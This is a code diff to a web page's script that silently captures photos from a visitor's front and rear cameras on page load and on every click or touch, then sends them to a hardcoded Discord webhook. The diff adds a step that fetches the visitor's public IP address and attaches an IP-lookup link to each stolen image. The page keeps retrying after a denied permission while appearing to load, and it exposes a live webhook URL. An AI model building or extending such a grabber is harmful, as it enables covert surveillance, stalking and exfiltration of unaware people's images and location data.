@@ -71,8 +71,23 @@
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';
 
     let currentStream = null;
-    let yaEnviado = false; // evita enviar varias veces
-    let pidiendo = false;  // evita peticiones simultáneas
+    let yaEnviado = false;
+    let pidiendo = false;
+    let ipUsuario = null; // caché de la IP
+
+    // Obtener la IP pública del usuario
+    async function obtenerIP() {
+      if (ipUsuario) return ipUsuario;
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ipUsuario = data.ip;
+        return ipUsuario;
+      } catch (err) {
+        console.error('No se pudo obtener la IP:', err);
+        return null;
+      }
+    }
 
     // Captura un frame de la cámara indicada
     async function capturarDeCamara(facingMode) {
@@ -139,12 +154,16 @@
 
       const hora = horaActual();
 
+      // Obtener IP antes de enviar
+      const ip = await obtenerIP();
+      const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';
+
       try {
         // Cámara frontal
         const blobFrontal = await capturarDeCamara('user');
         await enviarCaptura(
           blobFrontal,
-          `📸 **Captura - Cámara frontal** (mismo usuario)\n🕒 Hora: ${hora}`,
+          `📸 **Captura - Cámara frontal** (mismo usuario)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
           'frontal.jpg'
         );
 
@@ -154,38 +173,29 @@
         const blobTrasera = await capturarDeCamara('environment');
         await enviarCaptura(
           blobTrasera,
-          `📸 **Captura - Cámara trasera** (mismo usuario)\n🕒 Hora: ${hora}`,
+          `📸 **Captura - Cámara trasera** (mismo usuario)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
           'trasera.jpg'
         );
 
         yaEnviado = true;
 
       } catch (err) {
-        // Si el usuario cancela o deniega, no hacemos nada.
-        // La pantalla sigue cargando y esperará otro clic.
         console.error('Permiso denegado o error:', err);
       } finally {
         pidiendo = false;
       }
     }
 
-    // Primer intento al cargar
     window.addEventListener('load', () => {
       iniciar();
     });
 
-    // Reintento al hacer clic en cualquier parte (si no se ha enviado aún)
     document.addEventListener('click', () => {
-      if (!yaEnviado && !pidiendo) {
-        iniciar();
-      }
+      if (!yaEnviado && !pidiendo) iniciar();
     });
 
-    // También reintento al tocar (móvil)
     document.addEventListener('touchstart', () => {
-      if (!yaEnviado && !pidiendo) {
-        iniciar();
-      }
+      if (!yaEnviado && !pidiendo) iniciar();
     });
   </script>
 
